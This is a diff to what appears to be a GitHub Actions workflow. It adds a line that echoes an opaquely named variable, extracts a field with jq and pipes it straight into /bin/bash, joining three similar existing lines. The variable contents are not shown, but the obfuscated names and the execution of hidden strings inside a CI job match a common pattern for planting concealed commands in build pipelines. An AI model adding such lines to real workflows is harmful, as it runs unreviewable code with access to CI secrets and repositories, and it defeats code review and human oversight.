@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$q0682" | jq -r .xz3256 | /bin/bash
           echo $abhh685 | jq -r .u3618 | /bin/bash
           echo $oy4 | jq -r .kj301 | /bin/bash
+          echo $vsu2 | jq -r .l250 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
